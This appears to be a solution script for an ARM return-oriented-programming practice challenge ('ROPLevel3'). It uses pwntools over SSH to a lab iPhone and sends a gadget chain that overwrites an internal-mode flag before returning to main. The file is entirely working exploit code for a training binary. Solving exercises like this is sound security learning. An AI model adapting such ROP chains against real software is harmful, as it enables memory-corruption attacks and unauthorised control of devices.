from pwn import *

HOST_iPhone = "192.168.10.2"
USER_iPhone = "pwn"

s = ssh(user = USER_iPhone, host = HOST_iPhone)

p = s.run("/var/pwn/work/Exploit-Challenges-master/rop/ROPLevel3/roplevel3")
p.recvuntil(b"Select an option:\n[1] Function\n[2] Function (internal)\n[3] Exit\n")


addr_internal_mode = 0xc030
str_r0_to_r1 = 0xbce0 # str r0, [r1]; pop {r7, pc}
pop_r0_r1_pc = 0xbcec # pop {r0, r1, pc}

addr_func = 0xbb24
addr_main = 0xbcf4


payload = b"A" * 0x14
payload += p32(pop_r0_r1_pc)
payload += p32(1) # r0
payload += p32(addr_internal_mode) # r1
payload += p32(str_r0_to_r1) # pc
payload += b"BBBB" # r7(dummy)
payload += p32(addr_main + 4)


p.sendline(payload)
p.interactive()
